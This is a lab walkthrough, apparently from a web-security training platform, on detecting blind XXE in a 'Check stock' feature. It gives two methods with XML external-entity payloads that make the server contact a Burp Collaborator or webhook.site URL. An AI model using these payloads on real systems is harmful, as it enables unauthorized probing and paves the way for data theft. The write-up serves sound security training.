# Lab: Blind XXE with Out-of-Band Interaction

## Description

This lab contains a "Check stock" feature that accepts XML input but does not display the parsed result. The objective is to identify a Blind XXE vulnerability by triggering out-of-band (OAST) interactions with an external domain.

## Vulnerability Overview

Since the application does not reflect the result of XML parsing in its response, direct retrieval of data is not possible. However, the XML parser processes external entities, allowing an attacker to force the server to initiate DNS lookups and HTTP requests to an attacker-controlled domain. Monitoring these interactions confirms the presence of a Blind XXE vulnerability.

---

## Method 1: Using Burp Collaborator (Burp Proffessional)

### Exploitation Steps

1. Navigate to a product page.
2. Click **Check stock**.
3. Intercept the POST request using Burp Suite Professional.
4. Insert the following DOCTYPE declaration between the XML declaration and the `<stockCheck>` element:

```xml id="6lwafg"
<!DOCTYPE stockCheck [
<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
]>
```

5. Replace the value of the `<productId>` element with:

```xml id="52rrvf"
&xxe;
```

The modified request becomes:

```xml id="gx4k8x"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

6. Forward the request.
7. Go to the Collaborator tab and click **Poll now**.
8. Observe the resulting DNS and HTTP interactions.

-

## Method 2: Using Webhook.site (Alternative)

### Exploitation Steps

1. Visit https://webhook.site and obtain a unique URL.
2. Intercept the stock check request.
3. Insert the following external entity:

```xml id="6xg8ob"
<!DOCTYPE stockCheck [
<!ENTITY xxe SYSTEM "https://webhook.site/YOUR-UNIQUE-ID">
]>
```

4. Replace the product ID with:

```xml id="d3z5dg"
&xxe;
```

5. Forward the request.
6. Monitor Webhook.site for incoming requests.

### Result

If the XML parser processes the external entity, the application server will perform a DNS lookup and an HTTP request to the Webhook.site URL. The received interaction confirms the existence of the Blind XXE vulnerability.

---

